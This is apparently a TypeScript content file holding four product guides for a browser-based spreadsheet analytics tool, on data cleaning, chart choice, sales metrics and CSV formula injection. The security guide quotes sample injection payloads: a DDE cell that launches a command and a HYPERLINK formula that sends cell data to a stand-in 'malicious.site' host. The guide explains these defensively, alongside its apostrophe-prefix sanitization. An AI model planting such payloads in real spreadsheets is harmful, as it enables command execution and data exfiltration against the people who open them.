export interface EducationalGuide {
  slug: string;
  title: string;
  subtitle: string;
  description: string;
  readingTimeMinutes: number;
  publishDate: string;
  category: "Data Hygiene" | "Visualization" | "Business Analytics" | "Spreadsheet Security";
  author: string;
  summaryPoints: string[];
  sections: {
    heading: string;
    subheading?: string;
    paragraphs: string[];
    callout?: {
      type: "tip" | "warning" | "formula";
      title: string;
      body: string;
    };
    codeOrExample?: {
      label: string;
      content: string;
    };
  }[];
  relatedSlugs: string[];
}

export const EDUCATIONAL_GUIDES: Record<string, EducationalGuide> = {
  "clean-excel-data": {
    slug: "clean-excel-data",
    title: "How to Clean Dirty Spreadsheet Data for Accurate MIS Reporting",
    subtitle: "A practical guide to whitespace trimming, duplicate handling, missing-value imputation, and type consistency before executive review.",
    description: "Learn proven spreadsheet cleaning workflows to eliminate whitespace, reconcile inconsistent date formats, and avoid skewed MIS dashboards.",
    readingTimeMinutes: 7,
    publishDate: "October 2026",
    category: "Data Hygiene",
    author: "OpenMIS Analytics Team",
    summaryPoints: [
      "Inconsistent trailing whitespace in category columns creates fragmented groups like 'Retail' vs 'Retail '.",
      "Mixed date formats (DD/MM/YYYY vs MM/DD/YYYY) corrupt monthly time-series aggregations.",
      "Empty cells must be treated differently from explicit zero values to avoid skewing average calculations.",
      "Reversible transformation history prevents irreversible data corruption in client-side dashboards.",
    ],
    sections: [
      {
        heading: "1. The Hidden Cost of Dirty Spreadsheets",
        paragraphs: [
          "Every week, thousands of MIS executives and business analysts present reports containing misleading numbers. The cause is rarely a bug in the charting library; it is almost always dirty data in the raw spreadsheet.",
          "Common culprits include invisible trailing spaces ('North ' vs 'North'), formatted currency symbols inside numeric fields ($4,200 stored as a string), and inconsistent date formats. These cause aggregation engines to create duplicate categories, drop valid rows, or miscalculate growth rates.",
        ],
        callout: {
          type: "warning",
          title: "The String-Number Trap",
          body: "If a single row in an Excel column contains 'N/A' or a footnote, Excel or CSV export may cast the entire column as Text. Aggregations like SUM will return 0 or NaN without alerting the analyst.",
        },
      },
      {
        heading: "2. Removing Invisible Whitespace and Non-Printing Characters",
        paragraphs: [
          "Data exported from enterprise ERPs or CRM portals frequently contains trailing spaces, leading non-breaking spaces (ASCII 160), or newline characters. In traditional Excel, analysts rely on =TRIM(CLEAN(A2)).",
          "OpenMIS automates this step with one-click reversible transformations. When trimming is enabled, every string cell has leading and trailing spaces stripped, instantly consolidating fragmented category rows back into unified totals.",
        ],
        codeOrExample: {
          label: "Excel Formula vs OpenMIS Profiler",
          content: "// Excel manual formula per column:\n=TRIM(CLEAN(SUBSTITUTE(A2, CHAR(160), \" \")))\n\n// OpenMIS Reversible Operation:\napplyOperation({ type: 'TRIM_WHITESPACE', columns: 'all' })",
        },
      },
      {
        heading: "3. Handling Missing Values: Zero vs Null",
        paragraphs: [
          "One of the most consequential errors in spreadsheet reporting is replacing missing values with zeroes indiscriminately. If a store was closed in February, its sales were not zero; they were absent.",
          "Calculating AVERAGE([100, 200, 0]) yields 100, whereas AVERAGE([100, 200, null]) yields 150. In OpenMIS, the Data Profiler highlights the exact missing value rate per column so analysts make conscious, auditable decisions.",
        ],
        callout: {
          type: "formula",
          title: "Average Calculation Rule",
          body: "Mean = Sum(Valid Values) / Count(Non-Null Values). Never impute 0 for missing rows unless a business transaction definitively occurred with zero quantity.",
        },
      },
      {
        heading: "4. Standardizing Date Formats for Time-Series Analysis",
        paragraphs: [
          "Time-series charts require a continuous date sequence. When international teams collaborate, dates often mix 'YYYY-MM-DD' with 'DD/MM/YYYY'.",
          "Ensure your date column uses ISO 8601 formatting ('2026-10-10') or consistent month-year periods ('2026-10') before computing Month-over-Month (MoM) growth rates.",
        ],
      },
    ],
    relatedSlugs: ["choose-chart-types", "sales-kpis-and-growth", "prevent-spreadsheet-errors"],
  },

  "choose-chart-types": {
    slug: "choose-chart-types",
    title: "The Practical Guide to Choosing the Right Chart Type for Business Data",
    subtitle: "Stop using 3D pie charts. Here is how to select charts based on dimensions, cardinality, and executive cognitive load.",
    description: "A business analyst's guide to selecting Bar, Line, Donut, Scatter, and Boxplot charts based on data cardinality and analytical intent.",
    readingTimeMinutes: 6,
    publishDate: "October 2026",
    category: "Visualization",
    author: "OpenMIS Analytics Team",
    summaryPoints: [
      "Time-series with 5+ data points should always use Line or Area charts to preserve temporal momentum.",
      "Categorical comparisons with fewer than 15 items belong in horizontal Bar or vertical Column charts.",
      "Donut charts should strictly be capped at 5-6 slices; excess categories must be grouped into 'Other'.",
      "Scatter plots reveal correlations between two continuous measures that tabular summaries hide.",
    ],
    sections: [
      {
        heading: "1. The Fundamental Rule of MIS Visuals",
        paragraphs: [
          "A business chart has exactly one purpose: to help decision-makers comprehend a business reality in under three seconds. Decorative charts with 30 multicolored slices or uncalibrated dual axes create confusion rather than clarity.",
          "When OpenMIS automatically generates a dashboard canvas from an uploaded file, it evaluates data types and cardinality to select the optimal visualization.",
        ],
      },
      {
        heading: "2. The Visual Decision Matrix",
        paragraphs: [
          "To pick the right chart, determine what relationship you need to communicate: Comparison, Trend over Time, Composition, or Distribution.",
        ],
        codeOrExample: {
          label: "Chart Selection Logic",
          content: "1. Time-series (Date + Measure)       -> Line / Area Chart\n2. Discrete Ranking (Dim + Measure)    -> Horizontal Bar Chart\n3. Small Composition (<= 6 slices)     -> Donut Chart\n4. Distribution Spread (1 Measure)     -> Boxplot / Histogram\n5. Measure vs Measure (2 Measures)     -> Scatter Plot",
        },
        callout: {
          type: "tip",
          title: "The Top-N Rule for Bar Charts",
          body: "When displaying categories with high cardinality (e.g. 150 customer names), sort descending and display the Top 10. Label the remainder as 'Other' to maintain executive readability.",
        },
      },
      {
        heading: "3. When to Use a Donut Chart (and When Never To)",
        paragraphs: [
          "Donut charts are effective only when showing part-to-whole relationships with a small number of distinct segments (e.g., Regional Split: North, South, East, West).",
          "Never use a donut chart for fine comparisons between 12 months or 20 product SKUs. The human eye struggles to compare arc lengths with precision; use a column chart instead.",
        ],
      },
      {
        heading: "4. The Value of the Screen-Reader Accessible Data Table Toggle",
        paragraphs: [
          "Executive charts must be auditable. In OpenMIS, every widget includes a one-click 'Switch to Data Table' toggle. This allows analysts to immediately verify the exact calculated values backing any chart point.",
        ],
      },
    ],
    relatedSlugs: ["clean-excel-data", "sales-kpis-and-growth"],
  },

  "sales-kpis-and-growth": {
    slug: "sales-kpis-and-growth",
    title: "How to Calculate Sales Growth, Margins, and Category Concentration",
    subtitle: "Essential formulas for Month-over-Month growth, profit margin ratios, run-rate projections, and Pareto concentration metrics.",
    description: "Learn the core mathematics behind executive sales reporting, including variance to target, MoM growth, and category dominance analysis.",
    readingTimeMinutes: 8,
    publishDate: "October 2026",
    category: "Business Analytics",
    author: "OpenMIS Analytics Team",
    summaryPoints: [
      "Month-over-Month (MoM) growth calculations must include safe-divide guards to handle zero-base periods.",
      "Profit margin is Net Profit / Revenue, never Net Profit / Cost (which is Markup).",
      "Pareto concentration (Top 20% products driving 80% revenue) reveals business vulnerability.",
      "Transparent metric cards should always show calculation evidentiary notes.",
    ],
    sections: [
      {
        heading: "1. Deterministic Business Mathematics vs Guesswork",
        paragraphs: [
          "Modern executive MIS reports rely on four fundamental pillars: Total Volume, Velocity (Growth), Efficiency (Margins), and Concentration (Customer/Product Dependency).",
          "In OpenMIS, all metrics are computed with pure deterministic math. There are no black-box AI approximations: every percentage, variance, and trend is derived from the verified data rows.",
        ],
      },
      {
        heading: "2. The Growth Formula and Safe-Divide Guards",
        paragraphs: [
          "The standard formula for Period-over-Period growth is ((Current - Previous) / Previous) * 100. However, in real spreadsheets, the previous period value is frequently zero or missing.",
          "Dividing by zero causes spreadsheet errors (#DIV/0!). In OpenMIS, our metrics engine utilizes safeDivide, returning a clean 0% or 'N/A' indicator rather than crashing the report.",
        ],
        codeOrExample: {
          label: "Safe Growth Calculation",
          content: "// Pure Typescript implementation:\nfunction calculateMoMGrowth(current: number, previous: number): number | null {\n  if (previous === 0 || isNaN(previous)) return null;\n  return ((current - previous) / Math.abs(previous)) * 100;\n}",
        },
        callout: {
          type: "formula",
          title: "Margin vs Markup",
          body: "Gross Margin % = ((Revenue - COGS) / Revenue) * 100. Markup % = ((Revenue - COGS) / COGS) * 100. Confusing these two in an executive MIS is a common mistake.",
        },
      },
      {
        heading: "3. Category Concentration and Dominance Analysis",
        paragraphs: [
          "A business with $10M in sales spread across 500 equal clients is far more resilient than one where two clients account for $8M.",
          "OpenMIS automatically generates deterministic insights calculating Top-N category concentration: 'Top 3 categories represent 68.4% of total sales volume'. This immediately alerts management to revenue concentration risk.",
        ],
      },
    ],
    relatedSlugs: ["choose-chart-types", "clean-excel-data"],
  },

  "prevent-spreadsheet-errors": {
    slug: "prevent-spreadsheet-errors",
    title: "Preventing Common Spreadsheet & DDE Formula Injection Errors",
    subtitle: "How to safeguard your business from CSV formula injection attacks and silent formula calculation corruption.",
    description: "Understand Dynamic Data Exchange (DDE) formula injection in CSV/Excel files and how OpenMIS automatically sanitizes exported reports.",
    readingTimeMinutes: 5,
    publishDate: "October 2026",
    category: "Spreadsheet Security",
    author: "OpenMIS Security Team",
    summaryPoints: [
      "CSV files are plain text, but Microsoft Excel executes cells beginning with '=', '+', '-', '@' as formulas.",
      "Malicious formulas can trigger Dynamic Data Exchange (DDE) to run external system commands or exfiltrate local files.",
      "Leading tab characters (\\t) or carriage returns (\\r) can bypass simplistic string matching filters.",
      "OpenMIS sanitizes all CSV and XLSX exports by prefixing dangerous formula symbols with a single apostrophe (').",
    ],
    sections: [
      {
        heading: "1. The Inherent Risk of Unsanitized CSV Exports",
        paragraphs: [
          "Many analysts believe CSV files are harmless plain text. In reality, when a user double-clicks a CSV file to open it in Microsoft Excel, Excel interprets any cell beginning with '=', '+', '-', or '@' as an active formula.",
          "Attackers can leverage this behavior to execute Dynamic Data Exchange (DDE) commands, potentially launching command-line processes or pinging remote webhooks with sensitive desktop data.",
        ],
        callout: {
          type: "warning",
          title: "The Formula Injection Vector",
          body: "A cell containing '=cmd|\'/C calc\'!A0' or '=HYPERLINK(\"http://malicious.site/leak?\"&A1, \"Click to verify\")' will execute or prompt the user the moment the exported file is opened.",
        },
      },
      {
        heading: "2. The OpenMIS Neutralization Standard",
        paragraphs: [
          "OpenMIS implements automated formula sanitization on every CSV and XLSX download. Before writing a cell, the sanitizer inspects the raw value.",
          "If a cell starts with an injection character, OpenMIS prepends a single quotation mark ('). This forces Excel to treat the cell strictly as literal text without altering legitimate negative numbers like -42 or positive integers like +100.",
        ],
        codeOrExample: {
          label: "Sanitization Rules",
          content: "Raw Cell:    '=cmd|\'/C calc\'!A0'\nExported:    ''=cmd|\'/C calc\'!A0'\nExcel View:  =cmd|'/C calc'!A0 (Rendered as plain text, no execution)\n\nRaw Number:  -4500.50\nExported:    -4500.50 (Recognized as valid numeric value)",
        },
      },
      {
        heading: "3. Client-Side Data Isolation",
        paragraphs: [
          "Unlike cloud-based BI systems that upload your spreadsheet rows to remote servers, OpenMIS runs entirely inside your browser sandbox. Your rows never transit the public internet, eliminating man-in-the-middle data interception risks.",
        ],
      },
    ],
    relatedSlugs: ["clean-excel-data", "sales-kpis-and-growth"],
  },
};
